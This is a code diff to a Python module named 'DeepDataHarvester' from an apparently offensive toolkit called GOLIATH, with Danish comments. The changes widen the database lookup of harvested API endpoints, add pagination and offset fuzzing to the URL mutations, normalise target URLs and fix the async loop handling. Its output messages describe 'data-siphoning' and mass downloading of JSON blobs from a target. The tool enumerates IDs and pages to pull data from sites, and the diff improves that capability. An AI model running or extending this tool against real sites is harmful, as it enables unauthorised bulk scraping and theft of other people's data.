@@ -43,7 +43,8 @@ class DeepDataHarvester(BaseModule):
             try:
                 with sqlite3.connect(db_path) as conn:
                     cursor = conn.cursor()
-                    cursor.execute("SELECT endpoint FROM extracted_apis WHERE target=? ORDER BY timestamp DESC LIMIT 10", (target,))
+                    clean_target = target.replace('https://', '').replace('http://', '').replace('www.', '')
+                    cursor.execute("SELECT endpoint FROM extracted_apis WHERE target LIKE ? ORDER BY timestamp DESC LIMIT 50", (f"%{clean_target}%",))
                     for row in cursor.fetchall():
                         endpoints.add(row[0])
             except Exception as e:
@@ -61,6 +62,12 @@ class DeepDataHarvester(BaseModule):
             suffix = url[match.end():]
             for i in range(1, self.max_mutations + 1):
                 mutations.append(f"{prefix}{base_val + i}{suffix}")
+        else:
+            # GOLIATH V50 (Expansion): Fallback til Pagination / Offset Fuzzing
+            separator = "&" if "?" in url else "?"
+            for i in range(1, 10):
+                mutations.append(f"{url}{separator}page={i}")
+                mutations.append(f"{url}{separator}offset={i*10}")
         return mutations
 
     async def _harvest_mass_data(self, urls: List[str], target: str):
@@ -80,6 +87,10 @@ class DeepDataHarvester(BaseModule):
     def run(self, driver: Optional[Any] = None, target: str = "") -> Dict[str, Any]:
         print(f"\n{C.CYAN}{'='*60}\n[26] DEEP DATA HARVESTER & MUTATOR V50\n{'='*60}{C.RESET}")
         self.target = target.strip() if target else "https://example.com"
+        
+        # GOLIATH AUTO-HEAL: Normaliser target så det matcher datalaken
+        self.target = re.sub(r'^(https?://)?https?www\.', 'https://www.', self.target)
+        self.target = re.sub(r'^(https?://)+', 'https://', self.target)
         if not self.target.startswith("http"): self.target = f"https://{self.target}"
         self.data["Target"] = self.target
         
@@ -97,9 +108,15 @@ class DeepDataHarvester(BaseModule):
             
         print(f"{C.MAGENTA}[*] Genererede {len(all_mutated_urls)} målrettede URL'er til data-siphoning.{C.RESET}")
         
-        loop = asyncio.get_event_loop()
-        if not loop.is_running(): loop.run_until_complete(self._harvest_mass_data(all_mutated_urls, self.target))
-        else: loop.create_task(self._harvest_mass_data(all_mutated_urls, self.target))
+        try:
+            loop = asyncio.get_running_loop()
+        except RuntimeError:
+            loop = None
+            
+        if loop and loop.is_running():
+            loop.create_task(self._harvest_mass_data(all_mutated_urls, self.target))
+        else:
+            asyncio.run(self._harvest_mass_data(all_mutated_urls, self.target))
         
         print(f"\n{C.GREEN}[✓] Deep Data Harvest fuldført! Suget {self.data['Payloads_Harvested']} JSON-blobs ned.{C.RESET}")
         datalake.ingest(self.name, self.target, self.data)
